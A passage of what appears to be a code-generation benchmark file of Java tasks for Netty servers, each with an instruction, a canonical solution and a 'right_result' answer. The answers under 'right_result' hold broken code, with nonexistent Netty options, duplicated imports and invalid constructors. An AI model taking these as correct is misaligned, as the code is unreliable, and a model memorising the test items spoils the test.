java.util.Map;\n\npublic class SofaNettyJaxrsServer implements EmbeddedJaxrsServer {\n\n    private final ServerConfig         serverConfig;\n    protected ServerBootstrap          bootstrap;\n    protected String                   hostname;\n    protected int                      port;\n    protected ResteasyDeployment       deployment;\n    protected String                   root;\n    protected SecurityDomain           domain;\n    private EventLoopGroup             eventLoopGroup;\n    private EventLoopGroup             eventExecutor;\n    private int                        ioWorkerCount;\n    private int                        executorThreadCount;\n    private SSLContext                 sslContext;\n    private int                        maxRequestSize;\n    private int                        backlog;\n    private List<ChannelHandler>       channelHandlers;\n    private Map<ChannelOption, Object> channelOptions;\n    private Map<ChannelOption, Object> childChannelOptions;\n    private List<ChannelHandler>       httpChannelHandlers;\n\n    public SofaNettyJaxrsServer(ServerConfig serverConfig) {\n        if (serverConfig == null) {\n            throw new IllegalArgumentException(\"server config is null\");\n        }\n        this.serverConfig = serverConfig;\n        this.deployment = new ResteasyDeployment();\n        this.root = \"\";\n        this.ioWorkerCount = SystemInfo.getCpuCores() * 2;\n        this.executorThreadCount = 16;\n        this.maxRequestSize = 1024 * 1024 * 10;\n        this.backlog = 128;\n        this.channelHandlers = Collections.emptyList();\n        this.channelOptions = Collections.emptyMap();\n        this.childChannelOptions = Collections.emptyMap();\n        this.httpChannelHandlers = Collections.emptyList();\n    }\n\n    @Override\n    public void start() {\n        boolean daemon = serverConfig.isDaemon();\n        boolean isEpoll = serverConfig.isEpoll();\n        NamedThreadFactory ioFactory = new NamedThreadFactory(\"SEV-REST-IO-\" + port, daemon);\n        NamedThreadFactory bizFactory = new NamedThreadFactory(\"SEV-REST-BIZ-\" + port, daemon);\n        eventLoopGroup = isEpoll ? new EpollEventLoopGroup(ioWorkerCount, ioFactory)\n            : new NioEventLoopGroup(ioWorkerCount, ioFactory);\n        eventExecutor = isEpoll ? new EpollEventLoopGroup(executorThreadCount, bizFactory)\n            : new NioEventLoopGroup(executorThreadCount, bizFactory);\n\n        bootstrap = new ServerBootstrap()\n            .group(eventLoopGroup)\n            .channel(isEpoll ? EpollServerSocketChannel.class : NioServerSocketChannel.class)\n            .childHandler(createChannelInitializer())\n            .option(ChannelOption.SO_BACKLOG, backlog)\n            .childOption(ChannelOption.SO_KEEPALIVE, serverConfig.isKeepAlive());\n\n        for (Map.Entry<ChannelOption, Object> entry : channelOptions.entrySet()) {\n            bootstrap.option(entry.getKey(), entry.getValue());\n        }\n\n        for (Map.Entry<ChannelOption, Object> entry : childChannelOptions.entrySet()) {\n            bootstrap.childOption(entry.getKey(), entry.getValue());\n        }\n\n        final InetSocketAddress socketAddress;\n        if (null == hostname || hostname.isEmpty()) {\n            socketAddress = new InetSocketAddress(port);\n        } else {\n            socketAddress = new InetSocketAddress(hostname, port);\n        }\n\n        bootstrap.bind(socketAddress).syncUninterruptibly();\n    }\n\n    private ChannelInitializer<SocketChannel> createChannelInitializer() {\n        final RequestDispatcher dispatcher = createRequestDispatcher();\n        if (sslContext == null) {\n            return new ChannelInitializer<SocketChannel>() {\n                @Override\n                public void initChannel(SocketChannel ch) throws Exception {\n                    setupHandlers(ch, dispatcher);\n                }\n            };\n        } else {\n            final SSLEngine engine = sslContext.createSSLEngine();\n            engine.setUseClientMode(false);\n            return new ChannelInitializer<SocketChannel>() {\n                @Override\n                public void initChannel(SocketChannel ch) throws Exception {\n                    ch.pipeline().addFirst(new SslHandler(engine));\n                    setupHandlers(ch, dispatcher);\n                }\n            };\n        }\n    }\n\n    private void setupHandlers(SocketChannel ch, RequestDispatcher dispatcher) {\n        ChannelPipeline channelPipeline = ch.pipeline();\n        channelPipeline.addLast(channelHandlers.toArray(new ChannelHandler[channelHandlers.size()]));\n        channelPipeline.addLast(new HttpRequestDecoder());\n        channelPipeline.addLast(new HttpObjectAggregator(maxRequestSize));\n        channelPipeline.addLast(new HttpResponseEncoder());\n        channelPipeline.addLast(httpChannelHandlers.toArray(new ChannelHandler[httpChannelHandlers.size()]));\n        channelPipeline.addLast(new RestEasyHttpRequestDecoder(dispatcher.getDispatcher(), root));\n        channelPipeline.addLast(new RestEasyHttpResponseEncoder());\n        channelPipeline.addLast(eventExecutor, new SofaRestRequestHandler(dispatcher));\n    }\n\n    protected RequestDispatcher createRequestDispatcher() {\n        return new RequestDispatcher((SynchronousDispatcher) deployment.getDispatcher(),\n            deployment.getProviderFactory(), domain);\n    }\n\n    @Override\n    public void stop() {\n        try {\n            eventLoopGroup.shutdownGracefully().sync();\n            eventExecutor.shutdownGracefully().sync();\n        } catch (Exception ignore) {\n        }\n        bootstrap = null;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelHandler;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.epoll.EpollEventLoopGroup;\nimport io.netty.handler.codec.http.HttpServerCodec;\nimport io.netty.handler.codec.http.HttpObjectAggregator;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\nimport org.jboss.resteasy.core.ResourceMethodInvoker;\nimport org.jboss.resteasy.core.container.ContainerRequestDispatcher;\nimport org.jboss.resteasy.core.container.ContainerResponseWriter;\nimport org.jboss.resteasy.core.spi.ResteasyDeployment;\nimport org.jboss.resteasy.plugins.server.netty.NettyHttpHandler;\nimport org.jboss.resteasy.plugins.server.netty.RequestDispatcher;\nimport org.jboss.resteasy.spi.ResteasyProviderFactory;\nimport org.jboss.resteasy.spi.ResteasyVersion;\nimport org.jboss.resteasy.spi.ResteasyDeployment;\nimport org.jboss.resteasy.spi.ResteasyProviderFactory;\nimport org.jboss.resteasy.spi.ResteasyVersion;\nimport org.jboss.resteasy.spi.ResteasyDeployment;\nimport org.jboss.resteasy.spi.ResteasyProviderFactory;\nimport org.jboss.resteasy.spi.ResteasyVersion;\nimport org.jboss.resteasy.spi.ResteasyDeployment;\nimport org.jboss.resteasy.spi.ResteasyProviderFactory;\nimport org.jboss.resteasy.spi.ResteasyVersion;\n\nimport javax.security.auth.login.SecurityDomain;\nimport java.util.List;\nimport java.util.Map;\n\npublic class SofaNettyJaxrsServer {\n    private final ServerConfig serverConfig;\n    private final ServerBootstrap bootstrap;\n    private final String hostname;\n    private final int port;\n    private final ResteasyDeployment deployment;\n    private final String root;\n    private final SecurityDomain domain;\n    private final EventLoopGroup eventLoopGroup;\n    private final EventLoopGroup eventExecutor;\n    private final int ioWorkerCount;\n    private final int executorThreadCount;\n    private final SSLContext sslContext;\n    private final int maxRequestSize;\n    private final int backlog;\n    private final List<ChannelHandler> channelHandlers;\n    private final Map<ChannelOption, Object> channelOptions;\n    private final Map<ChannelOption, Object> childChannelOptions;\n    private final List<ChannelHandler> httpChannelHandlers;\n\n    public SofaNettyJaxrsServer(ServerConfig serverConfig, String hostname, int port, ResteasyDeployment deployment, String root, SecurityDomain domain, int ioWorkerCount, int executorThreadCount, SSLContext sslContext, int maxRequestSize, int backlog, List<ChannelHandler> channelHandlers, Map<ChannelOption, Object> channelOptions, Map<ChannelOption, Object> childChannelOptions, List<ChannelHandler> httpChannelHandlers) {\n        this.serverConfig = serverConfig;\n        this.hostname = hostname;\n        this.port = port;\n        this.deployment = deployment;\n        this.root = root;\n        this.domain = domain;\n        this.ioWorkerCount = ioWorkerCount;\n        this.executorThreadCount = executorThreadCount;\n        this.sslContext = sslContext;\n        this.maxRequestSize = maxRequestSize;\n        this.backlog = backlog;\n        this.channelHandlers = channelHandlers;\n        this.channelOptions = channelOptions;\n        this.childChannelOptions = childChannelOptions;\n        this.httpChannelHandlers = httpChannelHandlers;\n\n        this.bootstrap = new ServerBootstrap();\n        this.eventLoopGroup = createEventLoopGroup(ioWorkerCount);\n        this.eventExecutor = createEventLoopGroup(executorThreadCount);\n        this.deployment.init();\n    }\n\n    private EventLoopGroup createEventLoopGroup(int threadCount) {\n        if (serverConfig.isEpoll()) {\n            return new EpollEventLoopGroup(threadCount);\n        } else {\n            return new NioEventLoopGroup(threadCount);\n        }\n    }\n\n    public void start() {\n        bootstrap.group(eventLoopGroup, eventExecutor)\n                .channel(serverConfig.isEpoll() ? EpollServerSocketChannel.class : NioServerSocketChannel.class)\n                .option(ChannelOption.SO_BACKLOG, backlog)\n                .childOption(ChannelOption.SO_REUSEADDR, true)\n                .childOption(ChannelOption.TCP_NODELAY, true)\n                .childOption(ChannelOption.SO_KEEPALIVE, true)\n                .childOption(ChannelOption.AUTO_READ, true)\n                .childOption(ChannelOption.CHUNKED_WRITE, true)\n                .childOption(ChannelOption.MAX_CONTENT_LENGTH, maxRequestSize)\n                .childOption(ChannelOption.SO_SNDBUF, 1024 * 1024)\n                .childOption(ChannelOption.SO_RCVBUF, 1024 * 1024)\n                .childOption(ChannelOption.CONNECTOR_BACKLOG, backlog)\n                .childOption(ChannelOption.ALLOCATOR, PooledByteBufAllocator.DEFAULT)\n                .childHandler(createChannelInitializer());\n\n        Channel channel = bootstrap.bind(hostname, port).syncUninterruptibly();\n        channel.closeFuture().sync();\n    }\n\n    public void stop() {\n        eventLoopGroup.shutdownGracefully();\n        eventExecutor.shutdownGracefully();\n    }\n\n    private ChannelInitializer<SocketChannel> createChannelInitializer() {\n        return new ChannelInitializer<SocketChannel>() {\n            @Override\n            protected void initChannel(SocketChannel ch) {\n                ch.pipeline().addLast(new LoggingHandler(LogLevel.INFO));\n                setupHandlers(ch, createRequestDispatcher());\n            }\n        };\n    }\n\n    private void setupHandlers(SocketChannel ch, RequestDispatcher dispatcher) {\n        ch.pipeline().addLast(httpChannelHandlers);\n        ch.pipeline().addLast(new HttpServerCodec());\n        ch.pipeline().addLast(new HttpObjectAggregator(maxRequestSize));\n        ch.pipeline().addLast(new NettyHttpHandler(deployment, dispatcher));\n        ch.pipeline().addLast(channelHandlers);\n    }\n\n    private RequestDispatcher createRequestDispatcher() {\n        return new ContainerRequestDispatcher(deployment, new ContainerResponseWriter(), new ResteasyProviderFactory(), ResteasyVersion.getVersion());\n    }\n}\n```"
  },
  {
    "Task_id": 177,
    "Instruction": "Task Description: Create a Java class that implements an embedded HTTP server using Netty framework, capable of handling HTTP requests and routing them to appropriate controller methods based on URI paths.\n\nClass Description: EmbedHttpServer is a Netty-based HTTP server implementation that provides request routing functionality to various controller methods. It supports adding custom controllers with RequestMapping annotations and handles both successful responses and error cases.\n\nAttributes:\n- port: int - The port number on which the server will listen\n- defaultController: DefaultController - The default controller to handle unmatched requests\n- controllerList: List<Object> - List of registered controller objects that handle specific routes\n- LOGGER: Logger - Logger instance for error and debug logging\n\nMethods:\n- EmbedHttpServer(int port) -> EmbedHttpServer - Constructor that initializes the server with specified port\n- invoke(String uri, Channel channel, FullHttpRequest request) -> FullHttpResponse - Routes the incoming request to the appropriate controller method based on URI matching\n- fixUri(String uri) -> String - Normalizes URI paths by ensuring proper slash formatting\n- start(GenericFutureListener startedListener) -> void - Starts the Netty server with specified configuration and event listeners\n- addController(Object obj) -> EmbedHttpServer - Registers a controller object to handle specific routes, supports method chaining",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelHandlerContext;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.SimpleChannelInboundHandler;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.FullHttpRequest;\nimport io.netty.handler.codec.http.FullHttpResponse;\nimport io.netty.handler.codec.http.HttpHeaderNames;\nimport io.netty.handler.codec.http.HttpHeaderValues;\nimport io.netty.handler.codec.http.HttpObjectAggregator;\nimport io.netty.handler.codec.http.HttpResponseStatus;\nimport io.netty.handler.codec.http.HttpServerCodec;\nimport io.netty.util.concurrent.GenericFutureListener;\nimport java.lang.reflect.Method;\nimport java.net.URI;\nimport java.util.ArrayList;\nimport java.util.HashMap;\nimport java.util.List;\nimport java.util.Map;\nimport org.pdown.gui.http.controller.DefaultController;\nimport org.pdown.gui.http.util.HttpHandlerUtil;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport org.springframework.web.bind.annotation.RequestMapping;\n\npublic class EmbedHttpServer {\n\n  private static final Logger LOGGER = LoggerFactory.getLogger(EmbedHttpServer.class);\n\n  private int port;\n  private DefaultController defaultController;\n  private List<Object> controllerList;\n\n  public EmbedHttpServer(int port) {\n    this.port = port;\n    this.defaultController = new DefaultController();\n    this.controllerList = new ArrayList<>();\n  }\n\n  public FullHttpResponse invoke(String uri, Channel channel, FullHttpRequest request) throws Exception {\n    if (controllerList != null) {\n      for (Object obj : controllerList) {\n        Class<?> clazz = obj.getClass();\n        RequestMapping mapping = clazz.getAnnotation(RequestMapping.class);\n        if (mapping != null) {\n          String mappingUri = fixUri(mapping.value()[0]);\n          for (Method actionMethod : clazz.getMethods()) {\n            RequestMapping subMapping = actionMethod.getAnnotation(RequestMapping.class);\n            if (subMapping != null) {\n              String subMappingUri = fixUri(subMapping.value()[0]);\n              if (uri.equalsIgnoreCase(mappingUri + subMappingUri)) {\n                return (FullHttpResponse) actionMethod.invoke(obj, channel, request);\n              }\n            }\n          }\n        }\n      }\n    }\n    return defaultController.handle(channel, request);\n  }\n\n  private String fixUri(String uri) {\n    StringBuilder builder = new StringBuilder(uri);\n    if (builder.indexOf(\"/\") != 0) {\n      builder.insert(0, \"/\");\n    }\n    if (builder.lastIndexOf(\"/\") == builder.length() - 1) {\n      builder.delete(builder.length() - 1, builder.length());\n    }\n    return builder.toString();\n  }\n\n  public void start(GenericFutureListener startedListener) {\n    NioEventLoopGroup bossGroup = new NioEventLoopGroup(2);\n    NioEventLoopGroup workGroup = new NioEventLoopGroup(2);\n    try {\n      ServerBootstrap bootstrap = new ServerBootstrap().group(bossGroup, workGroup)\n          .channel(NioServerSocketChannel.class)\n          .childHandler(new ChannelInitializer<Channel>() {\n            @Override\n            protected void initChannel(Channel ch) throws Exception {\n              ch.pipeline().addLast(\"httpCodec\", new HttpServerCodec());\n              ch.pipeline().addLast(new HttpObjectAggregator(4194304));\n              ch.pipeline()\n                  .addLast(\"serverHandle\", new SimpleChannelInboundHandler<FullHttpRequest>() {\n\n                    @Override\n                    protected void channelRead0(ChannelHandlerContext ctx, FullHttpRequest request) throws Exception {\n                      URI uri = new URI(request.uri());\n                      FullHttpResponse httpResponse = invoke(uri.getPath(), ctx.channel(), request);\n                      if (httpResponse != null) {\n                        httpResponse.headers().set(HttpHeaderNames.CONNECTION, HttpHeaderValues.KEEP_ALIVE);\n                        httpResponse.headers().set(HttpHeaderNames.CONTENT_LENGTH, httpResponse.content().readableBytes());\n                        ch.writeAndFlush(httpResponse);\n                      }\n                    }\n\n                    @Override\n                    public void channelUnregistered(ChannelHandlerContext ctx) {\n                      ctx.channel().close();\n                    }\n\n                    @Override\n                    public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n                      LOGGER.error(\"native request error\", cause.getCause() == null ? cause : cause.getCause());\n                      Map<String, Object> data = new HashMap<>();\n                      data.put(\"error\", cause.getCause().toString());\n                      FullHttpResponse httpResponse = HttpHandlerUtil.buildJson(data);\n                      httpResponse.setStatus(HttpResponseStatus.INTERNAL_SERVER_ERROR);\n                      ctx.channel().writeAndFlush(httpResponse);\n                    }\n                  });\n            }\n          });\n      ChannelFuture f = bootstrap.bind(\"127.0.0.1\", port).sync();\n      if (startedListener != null) {\n        f.addListener(startedListener);\n      }\n      f.channel().closeFuture().sync();\n    } catch (Exception e) {\n      e.printStackTrace();\n    } finally {\n      bossGroup.shutdownGracefully();\n      workGroup.shutdownGracefully();\n    }\n  }\n\n  public EmbedHttpServer addController(Object obj) {\n    this.controllerList.add(obj);\n    return this;\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelHandler;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.FullHttpRequest;\nimport io.netty.handler.codec.http.HttpResponse;\nimport io.netty.handler.codec.http.HttpVersion;\nimport io.netty.handler.codec.http.LastHttpContent;\nimport io.netty.handler.codec.http.HttpResponseStatus;\nimport io.netty.handler.codec.http.HttpHeaderNames;\nimport io.netty.handler.codec.http.HttpHeaders;\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.logging.Logger;\nimport java.lang.reflect.Method;\nimport java.lang.annotation.Annotation;\nimport java.lang.annotation.Retention;\nimport java.lang.annotation.RetentionPolicy;\nimport java.lang.annotation.Target;\nimport java.lang.annotation.ElementType;\n\n@Retention(RetentionPolicy.RUNTIME)\n@Target(ElementType.METHOD)\npublic @interface RequestMapping {\n    String value();\n}\n\npublic class EmbedHttpServer {\n    private final int port;\n    private final DefaultController defaultController;\n    private final List<Object> controllerList;\n    private final Logger LOGGER;\n\n    public EmbedHttpServer(int port) {\n        this.port = port;\n        this.defaultController = new DefaultController();\n        this.controllerList = new ArrayList<>();\n        this.LOGGER = Logger.getLogger(EmbedHttpServer.class.getName());\n    }\n\n    public FullHttpResponse invoke(String uri, Channel channel, FullHttpRequest request) {\n        String normalizedUri = fixUri(uri);\n        for (Object controller : controllerList) {\n            for (Method method : controller.getClass().getDeclaredMethods()) {\n                if (method.isAnnotationPresent(RequestMapping.class)) {\n                    RequestMapping annotation = method.getAnnotation(RequestMapping.class);\n                    if (annotation.value().equals(normalizedUri)) {\n                        try {\n                            FullHttpResponse response = (FullHttpResponse) method.invoke(controller, request, channel);\n                            return response;\n                        } catch (Exception e) {\n                            LOGGER.severe(\"Error invoking controller method: \" + e.getMessage());\n                            return new DefaultFullHttpResponse(HttpVersion.HTTP_1_1, HttpResponseStatus.INTERNAL_SERVER_ERROR);\n                        }\n                    }\n                }\n            }\n        }\n        return defaultController.handleRequest(uri, channel, request);\n    }\n\n    private String fixUri(String uri) {\n        if (uri.endsWith(\"/\")) {\n            return uri;\n        }\n        if (uri.length() > 0 && uri.charAt(uri.length() - 1) != '/') {\n            return uri + \"/\";\n        }\n        return uri;\n    }\n\n    public void start(GenericFutureListener<ChannelFuture> startedListener) {\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 protected void initChannel(SocketChannel ch) {\n                     ch.pipeline().addLast(new HttpRequestHandler());\n                 }\n             })\n             .option(ChannelOption.SO_BACKLOG, 100)\n             .childOption(ChannelOption.SO_REUSEADDR, true);\n            ChannelFuture future = b.bind(port).addListener(startedListener);\n            future.sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n\n    public EmbedHttpServer addController(Object obj) {\n        controllerList.add(obj);\n        return this;\n    }\n\n    private static class HttpRequestHandler extends SimpleChannelInboundHandler<FullHttpRequest> {\n        @Override\n        protected void channelRead0(ChannelHandlerContext ctx, FullHttpRequest request) {\n            String uri = request.uri();\n            Channel channel = ctx.channel();\n            FullHttpResponse response = new DefaultFullHttpResponse(HttpVersion.HTTP_1_1, HttpResponseStatus.OK);\n            try {\n                response = new EmbedHttpServer().invoke(uri, channel, request);\n            } catch (Exception e) {\n                response = new DefaultFullHttpResponse(HttpVersion.HTTP_1_1, HttpResponseStatus.INTERNAL_SERVER_ERROR);\n            }\n            ctx.write(response);\n            ctx.flush();\n            ctx.close();\n        }\n    }\n\n    private static class DefaultController {\n        public FullHttpResponse handleRequest(String uri, Channel channel, FullHttpRequest request) {\n            return new DefaultFullHttpResponse(HttpVersion.HTTP_1_1, HttpResponseStatus.NOT_FOUND);\n        }\n    }\n\n    private static class DefaultFullHttpResponse extends FullHttpResponse {\n        public DefaultFullHttpResponse(HttpVersion version, HttpResponseStatus status) {\n            super(new DefaultHttpContent(Unpooled.copiedBuffer(\"HTTP/1.1 \" + status.code() + \" \" + status.reasonPhrase(), CharsetUtil.UTF_8)), null);\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 178,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework with line-based frame decoding capability. The server should handle incoming connections, process line-delimited messages, and manage resources properly during startup and shutdown.\n\nClass Description: MyLineBasedFrameDecoderServer is a Netty-based TCP server that uses line-based frame decoding for handling text protocols. It manages server lifecycle including startup, connection handling, and graceful shutdown.\n\nAttributes:\n- bossGroup: [NioEventLoopGroup] - Handles incoming connection requests and accepts them\n- workerGroup: [NioEventLoopGroup] - Handles I/O operations for accepted connections\n- bootstrap: [ServerBootstrap] - Netty server configuration and management object\n- DEFAULT_PORT: [int] - Default port number for the server (8023)\n\nMethods:\n- start([int port]) -> [void] - Starts the server on specified port, binds handlers, and begins accepting connections. Throws Exception if startup fails.\n- shutdown() -> [void] - Gracefully shuts down the server by releasing all thread resources\n- main([String[] args]) -> [void] - Entry point that creates and starts the server instance on default port",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\n\npublic class MyLineBasedFrameDecoderServer {\n\n    public static int DEFAULT_PORT = 8023;\n\n    private EventLoopGroup bossGroup;\n    private EventLoopGroup workerGroup;\n    private ServerBootstrap bootstrap;\n\n    public MyLineBasedFrameDecoderServer() {\n        bossGroup = new NioEventLoopGroup(1);\n        workerGroup = new NioEventLoopGroup();\n        bootstrap = new ServerBootstrap();\n    }\n\n    public void start(int port) throws Exception {\n        try {\n            bootstrap.group(bossGroup, workerGroup)\n                    .channel(NioServerSocketChannel.class)\n                    .childHandler(new MyLineBasedFrameDecoderChannelInitializer())\n                    .option(ChannelOption.SO_BACKLOG, 128)\n                    .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = bootstrap.bind(port).sync();\n            System.out.println(\"MyLineBasedFrameDecoderServer\u5df2\u542f\u52a8\uff0c\u7aef\u53e3\uff1a\" + port);\n            f.channel().closeFuture().sync();\n        } finally {\n            shutdown();\n        }\n    }\n\n    public void shutdown() {\n        workerGroup.shutdownGracefully();\n        bossGroup.shutdownGracefully();\n    }\n\n    public static void main(String[] args) throws Exception {\n        int port = DEFAULT_PORT;\n        MyLineBasedFrameDecoderServer server = new MyLineBasedFrameDecoderServer();\n        server.start(port);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.server.NioServerSocketChannel;\nimport io.netty.handler.codec.linebased.LineBasedFrameDecoder;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\nimport io.netty.handler.timeout.IdleStateHandler;\nimport java.util.concurrent.TimeUnit;\n\npublic class MyLineBasedFrameDecoderServer {\n    private final EventLoopGroup bossGroup;\n    private final EventLoopGroup workerGroup;\n    private final ServerBootstrap bootstrap;\n    private static final int DEFAULT_PORT = 8023;\n\n    public MyLineBasedFrameDecoderServer() {\n        bossGroup = new NioEventLoopGroup();\n        workerGroup = new NioEventLoopGroup();\n        bootstrap = new ServerBootstrap();\n    }\n\n    public void start(int port) throws Exception {\n        bootstrap.group(bossGroup, workerGroup)\n                .channel(NioServerSocketChannel.class)\n                .handler(new LoggingHandler(LogLevel.INFO))\n                .childHandler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) {\n                        ChannelPipeline pipeline = ch.pipeline();\n                        pipeline.addLast(new LineBasedFrameDecoder(4096));\n                        pipeline.addLast(new MyServerHandler());\n                    }\n                })\n                .bind(port);\n    }\n\n    public void shutdown() {\n        bossGroup.shutdownGracefully();\n        workerGroup.shutdownGracefully();\n    }\n\n    public static void main(String[] args) {\n        try {\n            MyLineBasedFrameDecoderServer server = new MyLineBasedFrameDecoderServer();\n            server.start(DEFAULT_PORT);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static class MyServerHandler extends io.netty.handler.codec.string.StringDecoder {\n        @Override\n        protected void decode(io.netty.channel.ChannelHandlerContext ctx, Object msg, io.netty.buffer.ByteBuf byteBuf) throws Exception {\n            super.decode(ctx, msg, byteBuf);\n            if (byteBuf.isReadable()) {\n                String message = byteBuf.toString(io.netty.buffer.CharsetUtil.UTF_8);\n                System.out.println(\"Received: \" + message);\n            }\n        }\n\n        @Override\n        public void exceptionCaught(io.netty.channel.ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 180,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework, capable of handling Telnet connections with optional SSL encryption.\n\nClass Description: The TelnetServer class is a Netty-based TCP server implementation that listens for incoming Telnet connections. It supports optional SSL encryption and uses separate thread groups for connection acceptance and request processing. The server logs connection events and properly manages resources during shutdown.\n\nAttributes:\n- SSL: static final boolean - Flag indicating whether SSL encryption should be enabled (configured via system property)\n- PORT: static final int - The port number the server will bind to (configurable via system property, defaults to 8023 or 8992 for SSL)\n\nMethods:\n- start(): void - Starts the Telnet server, binds to the configured port, and begins accepting connections. Throws Exception if any error occurs during startup.\n  Input: None\n  Output: None (void)\n  Description: Initializes SSL context if enabled, creates event loop groups, configures server bootstrap with channel type and handlers, binds to port, and waits for server shutdown. Ensures proper resource cleanup during shutdown.",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.SelfSignedCertificate;\n\npublic final class TelnetServer {\n\n    static final boolean SSL = System.getProperty(\"ssl\") != null;\n    static final int PORT = Integer.parseInt(System.getProperty(\"port\", SSL? \"8992\" : \"8023\"));\n\n    public void start() throws Exception {\n        final SslContext sslCtx;\n        if (SSL) {\n            SelfSignedCertificate ssc = new SelfSignedCertificate();\n            sslCtx = SslContextBuilder.forServer(ssc.certificate(), ssc.privateKey()).build();\n        } else {\n            sslCtx = null;\n        }\n\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .handler(new LoggingHandler(LogLevel.INFO))\n             .childHandler(new TelnetServerInitializer(sslCtx));\n\n            b.bind(PORT).sync().channel().closeFuture().sync();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelHandlerContext;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.SslHandler;\nimport io.netty.util.concurrent.Future;\nimport io.netty.util.concurrent.GenericFutureListener;\n\npublic class TelnetServer {\n    public static final boolean SSL = Boolean.getBoolean(\"telnet.ssl\");\n    public static final int PORT = Integer.getInteger(\"telnet.port\", SSL ? 8992 : 8023);\n\n    public void start() throws Exception {\n        SslContext sslCtx = SSL ? new SslContextBuilder().protocol(\"TLSv1_2\").build() : null;\n\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 protected void initChannel(SocketChannel ch) {\n                     ChannelPipeline p = ch.pipeline();\n                     if (SSL) {\n                         p.addLast(sslCtx.newHandler(ch));\n                     }\n                     p.addLast(new LoggingHandler(LogLevel.INFO));\n                     p.addLast(new TelnetHandler());\n                 }\n             })\n             .option(ChannelOption.SO_BACKLOG, 100)\n             .childOption(ChannelOption.SO_REUSEADDR, true);\n\n            Channel ch = b.bind(PORT).sync().channel();\n            ch.closeFuture().sync();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n\n    private static class TelnetHandler extends 